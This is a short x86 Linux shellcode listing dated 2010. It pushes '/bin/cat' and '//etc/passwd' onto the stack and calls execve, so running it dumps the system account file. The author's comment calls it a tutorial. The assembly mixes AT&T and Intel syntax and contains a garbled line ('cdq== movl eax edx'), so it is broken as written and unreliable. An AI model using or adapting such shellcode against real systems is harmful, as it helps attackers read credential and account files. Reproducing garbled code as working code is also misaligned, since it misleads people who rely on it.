; linux/x86 cat etc/passwd 
; fb1h2s[]gmail[]com 
; 2010-02-12 
section .text 
        global _start 
_start: 
        ;This is just a tutorial 
        xorl    %eax,%eax       
     cdq== movl eax edx  
     push edx                    
     pushl 0x7461632f 
     pushl 0x6e69622f 
     mov ebx,esp   
     push edx       
     pushl 0x64777373  
     pushl  0x61702f2f  
     pushl 0x6374652f 
     mov ecx,esp  
     mov  $0xb,%al                               
     push edx 
     push ecx 
     push ebx 
     mov ecx,esp   
     int 80h    
